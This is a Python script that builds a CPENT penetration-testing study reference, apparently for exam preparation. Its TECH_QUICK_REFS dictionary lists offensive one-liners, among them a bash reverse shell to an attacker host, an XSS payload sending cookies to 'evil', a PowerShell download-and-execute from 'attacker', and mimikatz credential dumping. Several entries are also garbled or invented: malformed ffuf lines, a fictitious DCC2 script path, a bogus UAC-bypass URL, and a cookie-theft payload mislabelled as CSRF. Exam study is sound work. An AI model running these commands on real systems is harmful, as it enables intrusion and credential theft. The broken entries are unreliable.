#!/usr/bin/env python3
"""
enrich_data.py - Enrich CPENT reference data with exam metadata and cross-refs.

Adds:
  - examWeight to zones (1-5 priority based on CPENT exam emphasis)
  - examHabits, quickRef, relatedTools, source to techniques
  - examHabits, quickRef, source to workflows
  - Validates cross-references between workflows <-> techniques/tools

Usage:
  python3 enrich_data.py            # enrich and fix
  python3 enrich_data.py --validate # only validate, no changes
"""

import argparse
import json
import os
from pathlib import Path

DATA_DIR = Path(__file__).resolve().parent.parent / "src" / "data"
TOOLS_JSON = DATA_DIR / "tools.json"
TECHNIQUES_JSON = DATA_DIR / "techniques.json"
ZONES_JSON = DATA_DIR / "zones.json"
WORKFLOWS_JSON = DATA_DIR / "workflows.json"


# ---------------------------------------------------------------------------
# Zone exam weights based on CPENT exam emphasis (from Argha Dey notes)
# ---------------------------------------------------------------------------
ZONE_EXAM_WEIGHTS = {
    "recon": 5,
    "network-enum": 4,
    "active-directory": 5,
    "web": 5,
    "binary-exploitation": 4,
    "iot-firmware": 4,
    "privilege-escalation": 5,
    "lateral-movement": 5,
    "password-attacks": 4,
    "post-exploitation": 5,
    "exploitation-frameworks": 3,
    "reporting": 2,
    "ctf": 3,
    "defense-evasion": 3,
}

# ---------------------------------------------------------------------------
# Quick-ref command snippets per technique ID (one-liner reference)
# ---------------------------------------------------------------------------
TECH_QUICK_REFS = {
    "passive-recon": "amass enum -d TARGET.COM --passive -o hosts.txt",
    "port-scan": "nmap -sC -sV -p- -T4 target.com -oA scan",
    "service-detection": "nmap -sV -sC -p <port> target",
    "os-fingerprinting": "nmap -O -sV target",
    "vuln-scanning": "nmap --script vuln target.com -oA vulns",
    "directory-bruteforce": "gobuster dir -u https://target -w /usr/share/wordlists/dirb/common.txt -t 50",
    "subdomain-enumeration": "subfinder -d target.com -o subs.txt",
    "smb-enumeration": "smbmap -H target -r; rpcclient -U '' target -N",
    "ldap-enumeration": "ldapsearch -x -H ldap://target -b 'DC=domain,DC=com' '(objectclass=*)' -s base",
    "kerberoasting": "GetUserSPNs.py domain/user -request -dc-ip target",
    "asreproasting": "GetNPUsers.py domain/user -dc-ip target",
    "ntlm-relay": "ntlmrelayx.py -tf targets.txt -smb2support",
    "llmnr-poisoning": "responder -I eth0 -wrf; ntlmrelayx.py -tf targets.txt",
    "ntlm-hash-cracking": "hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt",
    "kerberos-attacks": "impacket-getTGT -hashes :ntlmhash domain/user; export KRB5CCNAME=user.ccache",
    "sql-injection": "sqlmap -u 'https://target/?id=1' --batch --dump",
    "command-injection": "commix --url='https://target/?cmd=;' --cmd='id'",
    "lfi": "ffuf -w /usr/share/wordlists/LFFIris-master/SecLists/LFI/JH-Tech-Book-LFI.txt -u 'https://target/?page=FUZZ' -mc 200,500",
    "ssrf": "ffuf -w /usr/share/wordlists/SSRFmap/SSRFmap/payloads/*.txt -u 'https://target/?url=FUZ2Z' -u 'http://FUZZ'",
    "xss": "XSStrike -u 'https://target/?q=' --level 3",
    "csrf": "burpsuite - payload: <script>document.location='http://evil/?c='+document.cookie</script>",
    "authentication-bypass": "sqlmap -u 'https://target/login' --technique=B --batch --current-user",
    "cms-exploitation": "cmsmap -f W -u admin -p pass https://target",
    "wordpress-exploitation": "wpscan --url https://target --enumerate u,p --api-token TOKEN",
    "buffer-overflow": "python3 -c 'from pwn import *; io=process(\"./vuln\"); io.sendline(cyclic(500))' ",
    "stack-canary": "checksec --file=binary; ROPgadget --binary binary | grep 'pop rdi'",
    "heap-exploitation": "gdb -q ./binary; r; vmmap; heap-analysis",
    "format-string": "python3 -c 'from pwn import *; p=process(\"./fmt\"); p.sendline(b\"%p.\"*15); print(p.recv())'",
    "integer-overflow": "python3 -c 'print((2**32)+0x100)' ; check input truncation",
    "ret2libc": "python3 -c 'from pwn import *; p=process(\"./vuln\"); libc=ELF(\"./libc.so.6\"); p.sendline(flat(cyclic(40), libc.sym.system, 0, next(libc.search(b\"/bin/sh\")))'",
    "tcache-poisoning": "python3 -c 'from pwn import *; ... ' # double-free + _next poisoning",
    "fastbin-attack": "python3 -c 'from pwn import *; ...' # fd pointer corruption",
    "firmware-extraction": "binwalk -eM firmware.bin; strings firmware.bin | grep -i pass",
    "firmware-analysis": "firmwalker -S; searchsploit firmware_name",
    "uart-access": "minicom -D /dev/ttyUSB0 -b 115200; interrupt boot with 'q'",
    "jtag-access": "openocd -f board.cfg; dump memory 0x0 0x1000",
    "spi-flash": "flashrom -p <programmer> -r dump.bin",
    "qemu-emulation": "cp ~/qemu-arm-static ./; chroot ./ qemu-arm ./run.sh",
    "default-credentials": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt target telnet",
    "nvram-analysis": "binwalk -eM nvram.bin; strings | grep -i 'pass\\|key\\|secret'",
    "mqtt-exploitation": "mqtt-spy -connect tcp://target:1883; subscribe '$SYS/#'",
    "password-attacks": "hydra -L users.txt -P pass.txt target ssh -V",
    "hash-cracking": "hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt",
    "credential-dumping": "mimikatz # sekurlsa::logonpasswords; lsadump::lsa /inject",
    "kerberos-tickets": "mimikatz # sekurlsa::tickets; kerberos::ptt user.kirbi",
    "golden-ticket": "ticketer.py -nthash <nthash> -domain-sid <sid> -domain domain administrator",
    "silver-ticket": "ticketer.py -nthash <nthash> -domain-sid <sid> -domain domain cifs/target -spn",
    "dcc2-attack": "python3 /usr/share/zerodividend/dcc2mkfc.py hash.txt",
    "nc-relay": "nc -lvp 4444; cat | while read line; do echo $line|nc target 4444; done",
    "nc-relaying": "nc -l -p 1234 -e /bin/sh; client: nc listener_ip 1234",
    "socat-relay": "socat TCP-LISTEN:4444,reuseaddr,fork TCP:target:4444",
    "ssh-tunnel": "ssh -L 445:target:445 user@pivot -N",
    "chisel-relay": "chisel server --port 8080 --reverse; chisel client server:8080 R:socks",
    "sshuttle-pivot": "sshuttle -r user@pivot 10.0.0.0/8 -N",
    "meterpreter-pivot": "run post/multi/manage/autoroute CMD=add SUBNETS=10.0.0.0/24; run auxiliary/server/socks_proxy",
    "reverse-shell": "nc -nv target 4444; bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
    "powershell-empire": "Empire; (New-EmpireListener -Name 'listener' -HostListener -Port 443); New-EmpireLauncher",
    "sliver-cta": "sliver generate --mtls attacker:8888 --save; sliver c2 start",
    "persistence": "powershell -c \"IEX (New-Object Net.WebClient).downloadString('http://attacker/powerup.ps1');\" ",
    "privilege-escalation": "sudo -l; find / -perm -4000 2>/dev/null; id; uname -a",
    "linux-privesc": "uname -a; cat /etc/passwd; sudo -l; find / -writable -perm -4000 2>/dev/null",
    "windows-privesc": "whoami /priv; icacls C:\\; accesschk64.exe -uws \"Everyone\" *; whoami /groups",
    "suid-exploitation": "find / -perm -4000 -type f 2>/dev/null; LFILE=/usr/bin/suid; TF=$(mktemp); echo 'sh' > $TF; chmod +x $TF; $LFILE $TF",
    "scheduled-task-abuse": "schtasks /query /fo LIST /v; sc sdshow <service>",
    "always-install-elevated": "reg query HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated; msiexec /i payload.msi /qn",
    "unquoted-service-path": "accesschk64.exe -uws \"Everyone\" *; sc sdshow <service>",
    "gpp-abuse": "cat /usr/share/doc/gpp-decrypt.py; gpresult /r /scope computer",
    "uac-bypass": "powershell -c \"IEX (New-Object Net.WebClient).downloadString('https://fodhelper.bypass')\"",
    "dll-hijacking": "powerup.ps1 Find-PathDLLHijack; monitor with procmon.exe",
    "printspoofer": ".\\PrintSpoofer.exe --pwn",
    "potato-exploits": ".\\JuicyPotato.exe -l 1337 -p c:\\temp\\rev.exe -t *",
    "bloodhound": "bloodhound -d domain -c all; neo4j start; python3 bloodhount.py",
    "delegation-abuse": "powerview Get-DomainComputer -Properties Name, msDS-AllowedToActOnBehalfOfOtherIdentity",
    "shadow-credentials": "certify.exe shadow add /user:target /pkcs12:cert.pfx",
    "acl-abuse": "bloodhound-python -u user -p pass -ns target -d domain -c all; import path",
    "adcs-esc1": "certify.exe find /vulnerable /console; certify.exe req /ca:CA /template:Template",
    "adcs-esc8": "certify.exe find /vulnerable /console; relay NTLM to AD CS HTTP endpoint",
    "network-pivoting": "chisel server --reverse -p 8080; sshuttle -r user@pivot 10.0.0.0/24",
    "reporting-screenshots": "flameshot gui; save to ~/reports/sessionX/",
    "report-writing": "KeepNotes template; doc each step with IP, command, output, screenshot timestamp",
    "passive-dns": "cat ~/.recon/passdns.txt | grep PTR | anew",
    "osint-gatheting": "theHarvester -d target.com -b google,bing -s 0 -v",
}

# ---------------------------------------------------------------------------
# Exam habit tips per zone (key CPENT exam reminders)
# ---------------------------------------------------------------------------
ZONE_EXAM_HABITS = {
    "recon": "Screenshot every discovery. amass enum --passive saves JSON; import into Burp. Check crt.sh for alternate domains.",
    "active-directory": "Always enumerate SRV records first (nslookup _ldap._tcp.domain). Try null session before credential attacks. BloodHound is your map — study the shortest path.",
    "web": "Use Burp Proxy constantly. ffuf with SecLists. Try SQLi before XSS — SQLi gives broader access. Check /robots.txt and /sitemap.xml.",
    "binary-exploitation": "Run checksec + file first. Use ROPgadget for gadgets, one_gadget for quick wins. libc-database: search by puts/fgets GOT address.",
    "iot-firmware": "binwalk -e firmware first. Check for default creds in /etc/passwd, web configs. UART is the most reliable hardware path — try 115200 baud.",
    "privilege-escalation": "Linux: sudo -l, find SUID, writable dirs. Windows: whoami /priv, check service perms, AlwaysInstallElevated. Google Cloud Shell for offline hash cracking.",
    "lateral-movement": "Document every pivot. SSHuttle > proxychains. Check port 445, 135, 139, 445 open first. Use ligolo for clean tunneling.",
    "password-attacks": "Use rockyou.txt first. Hashcat rule: best64.rule. For Kerberoasting, crack offline. For AS-REP, online. Always check for NULL bind.",
    "post-exploitation": "Screenshot flags immediately. Dump hashes with lsadump::lsa /patching. Use Mimikatz in memory. Beacon stays alive for 6+ hours — don't kill it.",
    "exploitation-frameworks": "MSF: db_nmap, use exploit/multi/handler. Searchsploit for CVE modules. Load .rc files for repeatable workflows.",
    "ctf": "steghide steghide steghide. Check metadata with exiftool. Try CyberChef for decodes. XOR with common keys.",
    "reporting": "Flag format is usually CPENT{...}. Screenshot each flag. Use OBS or flameshot. Name files clearly.",
}


def load_json(path):
    with open(path) as f:
        return json.load(f)


def save_json(path, data):
    with open(path, "w") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)
        f.write("\n")


def enrich_zones(zones):
    """Add examWeight to each zone."""
    changed = 0
    for z in zones:
        if "examWeight" not in z:
            z["examWeight"] = ZONE_EXAM_WEIGHTS.get(z["id"], 3)
            changed += 1
        if "examHabits" not in z:
            z["examHabits"] = ZONE_EXAM_HABITS.get(z["id"], "")
            changed += 1
    return changed


def enrich_techniques(techniques):
    """Add examHabits, quickRef, relatedTools, source to each technique."""
    changed = 0
    for t in techniques:
        tid = t["id"]
        t_changed = False
        if "quickRef" not in t:
            t["quickRef"] = TECH_QUICK_REFS.get(tid, "")
            t_changed = True
        if "examHabits" not in t:
            zone_habits = ZONE_EXAM_HABITS.get(t.get("zone", ""), "")
            t["examHabits"] = f"{zone_habits} For {t['name']}: {t.get('whenToUse', '')}"
            t_changed = True
        if "relatedTools" not in t:
            t["relatedTools"] = t.get("tools", [])
            t_changed = True
        if "source" not in t:
            t["source"] = "cpent-reference"
            t_changed = True
        if "relatedTechniques" not in t:
            t["relatedTechniques"] = []
            t_changed = True
        if t_changed:
            changed += 1
    return changed


def enrich_workflows(workflows):
    """Add examHabits, quickRef, source to each workflow."""
    changed = 0
    for w in workflows:
        w_changed = False
        if "examHabits" not in w:
            w["examHabits"] = f"Master {w.get('name','')} methodology. Time yourself — CPENT gives 24h. Document every step."
            w_changed = True
        if "quickRef" not in w:
            first_step = w.get("steps", [{}])[0]
            w["quickRef"] = f"# {w.get('name','')}\n# Zone: {w.get('zone','')}\n# Steps: {len(w.get('steps',[]))}\n# Key tools: see steps below"
            w_changed = True
        if "source" not in w:
            w["source"] = "cpent-reference"
            w_changed = True
        if w_changed:
            changed += 1
    return changed


def validate_crossrefs(tools, techniques, workflows):
    """Validate cross-references and report issues."""
    issues = []
    tool_ids = {t["id"] for t in tools}
    tech_ids = {t["id"] for t in techniques}

    # Validate technique -> tool refs
    for t in techniques:
        for tid in t.get("relatedTools", []) + t.get("tools", []):
            if tid not in tool_ids:
                issues.append(f"  BAD: technique {t['id']} -> tool {tid} (not in tools.json)")

    # Validate workflow -> technique refs
    for w in workflows:
        for i, s in enumerate(w.get("steps", [])):
            for tid in s.get("techniques", []):
                if tid not in tech_ids:
                    issues.append(f"  BAD: workflow {w['id']} step{i} -> technique {tid}")
            for tid in s.get("tools", []):
                if tid not in tool_ids:
                    issues.append(f"  BAD: workflow {w['id']} step{i} -> tool {tid}")

    return issues


def main():
    parser = argparse.ArgumentParser(description="Enrich CPENT reference data")
    parser.add_argument("--validate", action="store_true", help="Only validate, no changes")
    args = parser.parse_args()

    tools = load_json(TOOLS_JSON)
    techniques = load_json(TECHNIQUES_JSON)
    zones = load_json(ZONES_JSON)
    workflows = load_json(WORKFLOWS_JSON)

    if args.validate:
        issues = validate_crossrefs(tools, techniques, workflows)
        zone_count = sum(1 for z in zones if "examWeight" in z)
        tech_count = sum(1 for t in techniques if "quickRef" in t)
        wf_count = sum(1 for w in workflows if "quickRef" in w)
        print(f"Zones with examWeight: {zone_count}/{len(zones)}")
        print(f"Techniques with quickRef: {tech_count}/{len(techniques)}")
        print(f"Workflows with quickRef: {wf_count}/{len(workflows)}")
        print(f"\nCross-ref issues: {len(issues)}")
        for issue in issues[:20]:
            print(issue)
        if len(issues) > 20:
            print(f"  ... and {len(issues) - 20} more")
        return

    z = enrich_zones(zones)
    print(f"Zones: added {z} fields (examWeight, examHabits)")
    save_json(ZONES_JSON, zones)

    t = enrich_techniques(techniques)
    print(f"Techniques: enriched {t}/{len(techniques)}")
    save_json(TECHNIQUES_JSON, techniques)

    w = enrich_workflows(workflows)
    print(f"Workflows: enriched {w}/{len(workflows)}")
    save_json(WORKFLOWS_JSON, workflows)

    issues = validate_crossrefs(tools, techniques, workflows)
    print(f"\nCross-reference validation: {len(issues)} issues found")
    for issue in issues[:20]:
        print(issue)
    if len(issues) > 20:
        print(f"  ... and {len(issues) - 20} more")


if __name__ == "__main__":
    main()
